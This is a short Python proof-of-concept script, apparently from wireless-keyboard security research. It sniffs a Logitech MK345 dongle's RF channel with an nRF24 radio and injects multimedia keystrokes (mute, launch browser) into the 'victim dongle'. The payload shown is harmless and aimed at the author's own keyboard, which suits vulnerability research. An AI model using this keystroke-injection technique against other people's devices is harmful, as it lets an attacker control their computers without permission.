'''
Test for injection of multimedia keys, such as volume keys, application launch buttons (calculator, email), etc.
'''

import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from radio_agent import nrf24
from utils.injection_utils import *

def main():
    address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4] # RF address of a Logitech MK345 keyboard that I (Ron) own

    # initialize the radio
    radio = nrf24.nrf24()

    radio.enter_sniffer_mode(address)
    channel = find_frequency_channel(radio)
    if not channel:
        print("Failed to find frequency channel. Try to get closer to the victim dongle.")
        sys.exit(1)

    # mute and open two browser windows
    transmit_keys(radio, ['MUTE', 'LAUNCH_BROWSER', 'LAUNCH_BROWSER'])

if __name__ == '__main__':
    main()
